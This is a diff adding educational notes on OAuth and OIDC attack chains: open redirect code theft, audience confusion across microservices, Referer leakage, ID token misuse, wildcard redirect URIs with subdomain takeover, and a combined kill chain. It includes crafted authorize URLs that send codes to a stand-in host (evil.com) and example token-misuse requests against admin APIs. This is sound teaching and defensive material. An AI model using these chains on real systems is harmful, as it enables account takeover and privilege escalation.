@@ -639,4 +639,324 @@ Mixing identities, tokens, or clients.
 
 • Most OAuth and OIDC vulnerabilities occur when applications treat tokens as simple credentials rather than verifying their intended audience, context, and binding to the original authentication request.
 
+-> Use Cases:
 
+1. Open Redirect + OAuth Authorization Code Theft:
+This is one of the classic OAuth kill chains.
+Architecture:
+
+User Browser
+     │
+     ▼
+Application
+     │
+     ▼
+Authorization Server
+
+The application registers this redirect URI:
+https://app.com/oauth/callback
+But the application also has an open redirect endpoint:
+https://app.com/redirect?url=
+
+-> Step-by-step attack:
+The attacker crafts this OAuth request:
+https://auth.company.com/authorize?
+ client_id=app123
+ &redirect_uri=https://app.com/redirect?url=https://evil.com
+ &response_type=code
+The victim logs in.
+The Identity Provider sends the authorization code to the registered redirect URI:
+https://app.com/redirect?url=https://evil.com&code=AUTH_CODE
+The application immediately redirects the browser to the attacker.
+https://evil.com?code=AUTH_CODE
+Now the attacker exchanges the code for tokens.
+
+-> Why this works:
+Three things combine:
+	1. OAuth redirect trust
+	2. Application open redirect
+	3. Code sent via URL
+Each issue alone seems minor, but together they leak the authorization code.
+
+2. OAuth Token Confusion Across Microservices
+This attack appears in large microservice environments.
+Architecture
+
+                ┌──────────────┐
+                │ Auth Server  │
+                └──────┬───────┘
+                       │
+         ┌─────────────┼─────────────┐
+         ▼             ▼             ▼
+    Profile API   Payment API    Admin API
+Each service expects tokens for itself.
+Example token:
+aud = profile-api
+
+-> Misconfiguration:
+Some APIs validate only:
+signature
+issuer
+But ignore the audience claim.
+
+-> Attack chain:
+	1. Attacker obtains a token for a low-privilege API.
+aud = profile-api
+	2. The attacker sends it to another API.
+GET /admin/deleteUser
+Authorization: Bearer profile_token
+	3. The admin API accepts the token because it only checks signature.
+
+Result:
+Privilege escalation across services.
+This attack is called token audience confusion.
+
+3. Referer Leakage + Third-Party Scripts + Code Exchange
+This attack combines browser behavior with OAuth flow design.
+Architecture:
+
+User Browser
+     │
+     ▼
+Application callback page
+     │
+     ├── analytics.js
+     ├── CDN scripts
+     └── images
+The OAuth callback URL looks like this:
+https://app.com/callback?code=AUTH_CODE
+
+-> Attack chain:
+The callback page loads external analytics:
+<script src="https://tracker.com/script.js">
+The browser requests the script:
+GET /script.js
+Host: tracker.com
+Referer: https://app.com/callback?code=AUTH_CODE
+The third-party domain now sees the authorization code.
+If the attacker controls or compromises that service, they steal the code and exchange it.
+
+-> Why this attack works:
+Three things combine:
+	1. OAuth code in URL
+	2. Browser referer behavior
+	3. Third-party resources
+
+4. ID Token Misuse + Missing Audience Validation
+This chain appears frequently in OIDC integrations.
+Architecture
+
+User
+ │
+ ▼
+Web Client
+ │
+ ▼
+API Gateway
+ │
+ ▼
+Backend APIs
+The client logs in with OpenID Connect and receives:
+ID token
+Access token
+
+-> Misconfiguration:-
+The API gateway accepts ID tokens as authentication.
+Developers think:
+JWT == valid identity
+But they never check the audience claim.
+
+-> Attack chain:
+	1. Attacker authenticates using another application.
+	2. They receive an ID token.
+aud = other-client
+	3. They send the ID token to the API.
+Authorization: Bearer ID_TOKEN
+	4. The gateway accepts it.
+
+Result:-
+The attacker authenticates to services they were never meant to access.
+
+5. OAuth Client Impersonation + Wildcard Redirect URI
+This is one of the most dangerous OAuth design mistakes.
+Architecture
+
+Identity Provider
+        │
+        ▼
+Multiple OAuth Clients
+Client registration allows wildcard redirects:
+https://*.app.com/callback
+
+-> Misconfiguration:-
+The authorization server allows:
+redirect_uri=https://anything.app.com/callback
+
+-> Attack chain:-
+The attacker registers a domain:
+evil.app.com
+Then starts OAuth:
+https://auth.company.com/authorize?
+ client_id=app123
+ &redirect_uri=https://evil.app.com/callback
+The user logs in.
+The authorization server sends the code to the attacker domain.
+https://evil.app.com/callback?code=AUTH_CODE
+The attacker exchanges it for tokens.
+
+-> Why this happens:
+Wildcard redirect validation creates implicit trust in subdomains.
+But attackers can sometimes control subdomains through:
+• subdomain takeover
+• DNS misconfiguration
+• cloud bucket hosting
+
+6. Full Architecture (Whiteboard View)
+a) 
+                         INTERNET
+                             │
+                             ▼
+                    ┌──────────────────┐
+                    │  User Browser    │
+                    └────────┬─────────┘
+                             │
+                             │ 1 Login Request
+                             ▼
+                 ┌────────────────────────┐
+                 │  Web Application       │
+                 │  app.company.com       │
+                 └────────┬───────────────┘
+                          │
+                          │ 2 OAuth Redirect
+                          ▼
+           ┌────────────────────────────────┐
+           │ Identity Provider (IdP)        │
+           │ auth.company.com               │
+           │ OAuth/OIDC Authorization Server│
+           └───────────────┬────────────────┘
+                           │
+                           │ 3 Authorization Code
+                           ▼
+                 ┌────────────────────────┐
+                 │ OAuth Callback Endpoint│
+                 │ /callback              │
+                 └────────┬───────────────┘
+                          │
+                          │ 4 Loads external resources
+                          ▼
+              ┌─────────────────────────────┐
+              │ Third-Party Analytics CDN   │
+              │ tracker.example.com         │
+              └────────┬────────────────────┘
+                       │
+                       │ 5 API Requests
+                       ▼
+                ┌───────────────────┐
+                │ API Gateway       │
+                └────────┬──────────┘
+                         │
+        ┌────────────────┼────────────────┐
+        ▼                ▼                ▼
+ ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
+ │ Profile API  │  │ Payment API  │  │ Admin API    │
+ └──────────────┘  └──────────────┘  └──────────────┘
+
+
+b) The 7 Vulnerabilities Present in the System:-
+Before the attack begins, the system already contains seven small weaknesses.
+• Vulnerability 1 — Wildcard Redirect URI
+The OAuth client allows:
+https://*.company.com/callback
+This means any subdomain is trusted.
+
+• Vulnerability 2 — Subdomain Takeover
+An old DNS entry still points to a deleted cloud resource:
+old.company.com
+An attacker claims this domain.
+
+• Vulnerability 3 — Open Redirect in the Web App
+The application has:
+/redirect?url=
+Example:
+https://app.company.com/redirect?url=https://site.com
+
+• Vulnerability 4 — Authorization Code in URL
+OAuth callback:
+/callback?code=AUTH_CODE
+Sensitive data exists in the URL.
+
+• Vulnerability 5 — Third-Party Scripts on Callback Page
+The callback page loads analytics:
+<script src="tracker.example.com/script.js">
+Browsers send the Referer header.
+
+• Vulnerability 6 — APIs Accept ID Tokens
+Backend APIs accept ID tokens instead of access tokens.
+
+• Vulnerability 7 — APIs Do Not Validate Audience
+APIs verify only:
+signature
+issuer
+They ignore:
+aud claim
+
+c) The Complete Attack Kill Chain:
+Now the attacker chains everything together.
+
+Step 1 — Attacker takes over a subdomain
+Because of DNS misconfiguration:
+old.company.com
+The attacker controls this domain.
+
+Step 2 — Exploit wildcard redirect trust
+Since OAuth allows:
+https://*.company.com/callback
+The attacker uses:
+https://old.company.com/callback
+Now the authorization server trusts it.
+
+Step 3 — Start OAuth login
+The attacker sends a link to the victim:
+https://auth.company.com/authorize?
+ client_id=webapp
+ &redirect_uri=https://old.company.com/callback
+The victim logs in at the legitimate IdP.
+
+Step 4 — Authorization code delivered to attacker
+After login:
+https://old.company.com/callback?code=AUTH_CODE
+The attacker receives the authorization code.
+
+Step 5 — Code exchanged for tokens
+The attacker calls the token endpoint:
+POST /token
+code=AUTH_CODE
+They receive:
+access_token
+id_token
+
+Step 6 — Token leakage through Referer
+The attacker tricks the victim to access:
+app.company.com/callback?code=AUTH_CODE
+The page loads analytics.
+The browser sends:
+Referer:
+https://app.company.com/callback?code=AUTH_CODE
+The analytics server logs the code.
+
+Step 7 — ID Token misuse
+The attacker sends the ID token to APIs:
+Authorization: Bearer ID_TOKEN
+Because the gateway accepts ID tokens, the request succeeds.
+
+Step 8 — Audience validation missing
+The attacker uses a token issued for Profile API.
+But sends it to:
+Admin API
+Since the API ignores the audience claim, it accepts the token.
+
+Step 9 — Full compromise
+The attacker now performs:
+GET /admin/export-users
+DELETE /admin/user
+They have effectively escalated privileges.
